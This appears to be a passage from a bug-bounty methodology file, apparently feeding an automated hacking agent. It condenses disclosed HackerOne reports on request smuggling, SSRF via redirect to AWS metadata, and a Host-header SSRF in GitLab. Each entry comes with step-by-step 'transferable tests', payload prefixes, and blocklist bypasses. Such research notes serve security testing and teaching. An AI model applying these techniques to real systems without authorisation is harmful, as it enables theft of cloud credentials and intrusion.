CHAIN: one chunked request with an oversized trailer → leftover bytes re-framed as a new request → smuggling → request-queue poisoning → capture of the next user's request / cache poisoning / auth bypass or ATO downstream. Framing desync alone; report the smuggled prefix's reach.
TRANSFERABLE TEST: on a proxied target, drive the back-end's parser ERROR PATH at a size boundary — an oversized TRAILER header line (~8190 B), an over-long single header, or an over-long chunk extension — followed by `a: GET /smuggled HTTP/1.1\r\nHost: attack`; two requests where the front-end saw one = smuggling (always compare front-end vs back-end counts).
WHY IT IS A NEW GENERAL METHOD: §17.20 (TE-header obfuscation), §17.56 (H2→H1.1 downgrade) and §17.77 (CRLF via rule-engine hex escapes) cover smuggling, but NONE covers smuggling reached through a SIZE-LIMIT ERROR PATH in the TRAILER parser — a distinct root cause and trigger (oversized trailer, not header obfuscation or protocol downgrade).

### [Bugbountyskills.md] 17.112 Multi-CONNECTOR SSRF — a provider/source selector exposes independently-protected server-side fetch paths, and a 303 redirect from the attacker defeats the internal-address blocklist → cloud IMDS (HelloSign / HackerOne #923132)

SOURCE: https://hackerone.com/reports/923132 — Dropbox, "Server Side Request Forgery (SSRF) at app.hellosign.com leads to AWS private keys disclosure", SSRF, $4,913, reporter ehsayaan; read from the reporter's public writeup `https://blogs.sayaan.in/dropbox-ssrf` (Sayaan Alam, 2020-11-10) because the report page/`.json`/Wayback were unreadable  read 2026-11-07
CLASS: SSRF in a document-import feature — per-connector protection inconsistency + redirect-based bypass of an internal-address blocklist → AWS EC2 IMDS disclosure (CWE-918)
CORE METHOD:
  1. `GET /attachment/externalFile?service_type=O&file_reference=<url>&file_name=<name>&c=0.826…` on app.hellosign.com fetches `file_reference` server-side; `service_type` selects the connector (`D`=Dropbox, `O`=OneDrive, others GDrive/Box/Evernote) and the fetched page is rendered into a readable PDF.
  2. The Dropbox connector (`service_type=D`) returned 404 to the collaborator URL (protected); the OneDrive connector (`service_type=O`) returned a collaborator ping — protection is PER-CONNECTOR.
  3. `file_reference=http://169.254.169.254/latest/` and `http://127.0.0.1` were then blocked (404); bypass by hosting a page that replies `303 Location: http://169.254.169.254/latest/meta-data/…` and pointing `file_reference` at it (technique credited by the reporter to report #247680).
  4. Result: full read of the EC2 instance metadata — IAM `AccessKeyId`, `SecretAccessKey`, `Token`.
DETECTION SIGNAL: a server-side fetch of a user-supplied URL behind an import/link/preview feature; a provider/source selector parameter (`service_type`/`source`/`provider`/`type`) implying multiple connectors that may not share protection; a URL (not an opaque id) reaching the fetch; a hostname-string blocklist of `169.254.169.254`/`127.0.0.1`.
CHAIN: attacker URL in a URL-typed parameter → server-side fetch (collaborator-confirmed) → attacker 303 redirect defeats the blocklist → EC2 IMDS read → IAM key + token disclosed → role-dependent cloud access. SSRF with internal/IMDS reach = High/Critical.
TRANSFERABLE TEST: for every import/attach-by-link/preview feature, send the SAME collaborator URL to EVERY value of the provider/source selector — one connector pinging while another 404s = inconsistent-protection SSRF; then defeat the internal blocklist with a 302/303 redirect (also try 307/308, DNS rebinding, `http://user@host/`, decimal/hex/octal IPs) to reach metadata and read the credentials.
WHY IT IS A NEW GENERAL METHOD: §17's SSRF lineage (17.40, 17.73, 17.93, 17.105) is single-fetch-path; the reusable idea here is the PROVIDER/SOURCE SELECTOR as an enumeration surface for independently-protected connectors, plus the redirect-based blocklist defeat — a distinct, quickly-applicable test for any "import from N providers" feature.

NOTE — §17 additions 2026-11-07 batch 27 (§17.109-§17.112 from 4 of the batch's 5 readable sources). The fifth readable source, Slack "Stored XSS through PDF viewer" (#881557, High 8.8, $4,875), got NO slot: its HackerOne body is `no-content` and only the program summary is public, and §17 already covers document-viewer/in-app-renderer XSS generically — the method is recorded in `/root/bugbountyhuntingskills.md` and the dated knowledge file, not promoted here. WHY EACH IS NEW: §17.109 = the file's first hostname parser-DIFFERENTIAL SSRF (validator vs resolver, reached by fixed-buffer truncation), distinct from the DNS-rebinding (#17.93) and read-oracle (#17.73) SSRF entries and from the ADDED 17.108 UNC/NTLM entry; §17.110 = smuggling through a SIZE-LIMIT ERROR PATH in the TRAILER parser, distinct from TE-header obfuscation (17.20), H2→H1.1 downgrade (17.56) and CRLF-via-rule-engine (17.77); §17.111 = the file's first inbound-EMAIL action-gateway BAC (identity = forgeable `From:`), distinct from every HTTP-request access-control entry; §17.112 = per-CONNECTOR SSRF enumeration in a multi-provider import feature plus the redirect blocklist bypass, distinct from the single-path SSRF lineage (17.40/17.73/17.93/17.105). Full per-source route/honesty records are in `/root/bugbountyhuntingskills.md` and `/root/hackbot-architecture/knowledge/methodologies-2026-11-07.md`.

### [Bugbountyskills.md] 17.123 An OAuth/token endpoint that builds its OUTBOUND url from the request `Host` (absolute route helper) is an unauthenticated blind SSRF — amplified by an `allow_local_requests`-style guard flag (GitLab / gitlab.com, HackerOne #398799)

CLASS/METHOD: a `Oauth::Jira::AuthorizationsController#access_token`-style method builds the provider token URL with an ABSOLUTE url helper (`oauth_token_url`), which resolves its host from the request's `Host` header, then POSTs to it with `Gitlab::HTTP.post(oauth_token_url, body: …, allow_local_requests: true)`. No auth is needed: the PoC is a single `POST` to `/-/jira/login/oauth/access_token` (or the Jira callback) with `Host: <target>:<port>`. Because `allow_local_requests` is set true, the SSRF guard that blocks loopback/RFC1918 is off, so internal hosts are reachable. The response is only partially parsed (JSON `token_type`/`scope`/`access_token`), so it is blind; the ~60 s TCP-read hang is a timing oracle.
DETECTION SIGNAL: an OAuth/OIDC/SAML token or callback endpoint whose outbound URL is computed with an absolute helper (`*_url`, `request.base_url`, `X-Forwarded-Host`-derived origin) instead of a configured constant; an SSRF guard in code neutralised by an `allow_local_requests`/`skip_ssrf`-type flag; any absolute redirect that reflects the `Host` header.
CHAIN: unauthenticated `Host`-controlled absolute URL (primitive) → server-side POST to an attacker-chosen host with local requests permitted → reach internal-only services (cloud metadata `169.254.169.254`, internal admin APIs) → data exposure / credential theft → (per doctrine §4) IAM creds → RCE.
TRANSFERABLE TEST: for every OAuth/SAML/token/callback endpoint, resend with `Host:` (and `X-Forwarded-Host:`) pointed at a Collaborator and watch for the backend request; then aim `Host` at `169.254.169.254:80`, `127.0.0.1:<port>` or an internal hostname and diff timing/response.
WHY IT IS A NEW GENERAL METHOD: the file already has a `Host`-header entry (§11.4, reset-link poisoning → ATO) and a Jira-OAuth SSRF entry (HackerOne #326040 U.S. DoD `consumerUri`/CVE-2017-9506) — but #326040 uses an ATTACKER-SUPPLIED URL PARAMETER. §17.123's new surface is the ABSOLUTE URL HELPER FED BY THE `Host` HEADER, which makes an SSRF out of endpoints whose URL parameters are validated, and adds the `allow_local_requests`-style guard-flag defeat that unlocks loopback/RFC1918.

